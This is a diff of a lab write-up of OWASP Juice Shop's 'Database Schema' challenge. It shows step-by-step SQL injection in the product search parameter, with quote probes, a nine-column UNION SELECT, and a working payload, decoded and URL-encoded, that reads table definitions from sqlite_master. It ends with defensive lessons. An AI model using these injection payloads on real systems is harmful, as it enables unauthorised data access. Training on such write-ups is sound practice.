@@ -1,59 +1,78 @@
-# Database Schema
+---
+sidebar_label: 'Challenge: Database Schema'
+---
+
+# Challenge: Database Schema
 
 **Category:** Injection · **Difficulty:** 3 stars
 
-I solved this challenge in my own OWASP Juice Shop lab. I used Burp Repeater to investigate the product search and retrieve database table definitions through SQL injection.
+## Task
 
-## Educational Purpose
+The goal was to retrieve the database schema through SQL injection in my own Juice Shop lab. A schema describes the structure of the database, including its tables and columns.
 
-I performed these exercises only in my own intentionally vulnerable Juice Shop training environment. This report is for educational and defensive learning. No third-party system or real user data was involved; test only systems you own or are explicitly authorized to assess.
+I investigated the product search because it sends the search text to the server in the `q` parameter. My hypothesis was that this input might become part of a SQL query.
 
-## Goal
+## Tests
 
-Investigate the three-star *Database Schema* injection challenge and retrieve database structure definitions from the training application. Explain the request, the observed responses, the weakness, and a suitable defense.
+I intercepted a product search and sent it to Burp Repeater. I changed the `q` value to find out whether the server treated my input only as search text or also as SQL.
 
-## Initial Observation
+| Test | Observed response | What I learned |
+| --- | --- | --- |
+| Search for `banana` | `200 OK`, with *Banana Juice* | This was my normal response for comparison. |
+| Add a quote: `test'` | `500 Internal Server Error`, with `SQLITE_ERROR` and `name LIKE '%test'%'` | The quote ended the SQL string early. My input affected the query syntax, and the error identified SQLite. |
+| Close the string and parentheses: `banana'))--` | `200 OK`, with `data: []` | The query was valid again. The remaining `LIKE '%banana'` pattern would only match names ending in `banana`, which explained the empty result. |
+| Add a `UNION SELECT` with nine fixed values, including `Probe` and `Nur ein Test` | `200 OK`, with `name: "Probe"` and `description: "Nur ein Test"` | Nine columns worked, and I could see text from my added query in the response. |
 
-The product search receives a `q` query parameter. A normal request for `banana` returned a product, while adding a single quote to a search value produced `500 Internal Server Error`. The error disclosed `SQLITE_ERROR` and part of the SQL statement, including `name LIKE '%test'%'`. This showed that the quote disrupted a SQL string and that the search used SQLite. The response alone did not reveal the database schema.
+The nine fields in the normal product response gave me a starting point. The successful UNION test confirmed that nine values worked. It returned a test row without saving a product. For background on why the column count matters, see [PortSwigger's explanation of UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks).
 
-## Investigation
+I sent each of the first three search values as a separate request in Burp Repeater. These are their request lines; headers are omitted:
 
-I intercepted the product-search request and varied only `q` in Burp Repeater. The values below are decoded for readability; spaces and other special characters were URL-encoded in the HTTP request.
+```http
+GET /rest/products/search?q=banana HTTP/1.1
+GET /rest/products/search?q=test%27 HTTP/1.1
+GET /rest/products/search?q=banana%27%29%29-- HTTP/1.1
+```
 
-| Step | Search value or change | Observed result | What it established |
-| --- | --- | --- | --- |
-| Baseline | `banana` | `200 OK`, returning *Banana Juice* | The search endpoint returned product data. |
-| Quote probe | `test'` | `500` with `SQLITE_ERROR` and the assembled SQL | The input affected SQL syntax inside a quoted `LIKE` value. |
-| Restore syntax | `banana'))--` | `200 OK` with `data: []` | Closing the string and parentheses, then commenting out the remaining SQL, produced a valid query. The empty result was consistent with the remaining `LIKE '%banana'` pattern, which matches names ending in `banana`. |
-| Check result shape | A `UNION SELECT` with nine fixed values, including `Probe` in position two | `200 OK`; `name` was `Probe` and `description` was `Nur ein Test` | The added result matched the product response's nine fields. Position two was visible as `name`. |
+In a request URL, `%27` represents a quote and `%29` a closing parenthesis.
 
-## Retrieving the Schema
+## Solution
 
-SQLite stores schema definitions in the `sql` column of `sqlite_master`. I replaced the fixed `Probe` value in the second `UNION SELECT` position with `sql` and placed `FROM sqlite_master WHERE type='table'` **before** the final SQL comment. An earlier attempt put `FROM` after `--`, which commented it out.
+I needed to find where SQLite stores table definitions. The [SQLite SQL injection cheatsheet](https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet) gave me `SELECT sql FROM sqlite_master WHERE type='table'`. I adapted my working nine-column UNION test: I replaced `Probe` with `sql` in the second position and added the table selection after the nine values.
 
-The final decoded search value was:
+My first attempt put `FROM` after `--`, so the SQL comment hid the part I needed. Moving `FROM sqlite_master WHERE type='table'` before the comment produced this working search value:
 
-```text
+```sql
 banana')) UNION SELECT 0,sql,'Nur ein Test',0,0,'',NULL,NULL,NULL FROM sqlite_master WHERE type='table'--
 ```
 
-The response placed a `CREATE TABLE` definition for `Addresses` in the JSON `name` field. Both queries returned nine columns, and the second column appeared as `name` in the product response. This displayed schema text without saving a product or changing the database.
+The value above is the readable, URL-decoded form of `q`. I used [CyberChef](https://gchq.github.io/CyberChef/) to prepare the URL-encoded form for the request, including its spaces and special characters. I then sent this request in Burp Repeater:
 
-## Cause, Risk, and Defense
+```http
+GET /rest/products/search?q=banana%27%29%29%20UNION%20SELECT%200%2Csql%2C%27Nur%20ein%20Test%27%2C0%2C0%2C%27%27%2CNULL%2CNULL%2CNULL%20FROM%20sqlite_master%20WHERE%20type%3D%27table%27-- HTTP/1.1
+```
 
-The search input became part of the SQL query text instead of being treated only as a value. This let me close the original search expression and add a `UNION SELECT` to read database metadata.
+The payload works as follows:
 
-In a real application, SQL injection could expose other data as well. Detailed database errors also reveal internal query structure. My exercise demonstrated schema retrieval; I did not test further data access or data changes.
-
-To prevent this weakness:
-
-- Pass search values as bound SQL parameters instead of inserting them into a query string.
-- Return generic errors to clients and keep detailed database diagnostics in protected server logs.
+- `banana'))` closes the original string and parentheses.
+- `UNION SELECT` adds rows from another query. Both queries must return nine columns here.
+- `sql` in the second position places a table definition in the response's `name` field. The other values fill the remaining columns.
+- `FROM sqlite_master WHERE type='table'` selects table definitions.
+- `--` comments out the rest of the original query.
 
 ## Result and Evidence
 
-In Burp Repeater, I observed a normal `200` result, a `500` SQLite syntax error, a valid empty `200` result, a synthetic `Probe` row, and a `200` response containing `CREATE TABLE` text for `Addresses`. Juice Shop then marked *Database Schema* as solved. The response excerpt described here does not establish how many schema objects were returned in total.
+The response returned `200 OK`. This is an excerpt of its JSON body; the supplied capture stops after `description`:
 
-The demonstration video is pending.
+```text
+"status":"success","data":[{"id":0,"name":"CREATE TABLE `Addresses` (`UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `fullName` VARCHAR(255), `mobileNum` INTEGER, `zipCode` VARCHAR(255), `streetAddress` VARCHAR(255), `city` VARCHAR(255), `state` VARCHAR(255), `country` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)","description":"Nur ein Test",
+```
+
+The `name` field shows one table definition, while `description` still contains my test value. The excerpt does not show the complete schema response. Juice Shop then marked *Database Schema* as solved in my lab.
+
+## Lessons Learned
+
+The search input changed the SQL query instead of remaining plain search text. That let me read a table definition, and the detailed error helped me identify SQLite. I did not test access to other data or changes to stored data.
+
+Search values should be passed as bound SQL parameters so they cannot change the query structure. The application should also return generic errors to clients and keep detailed database errors in protected server logs.
 
 [Back to Juice Shop Master](../README.md)
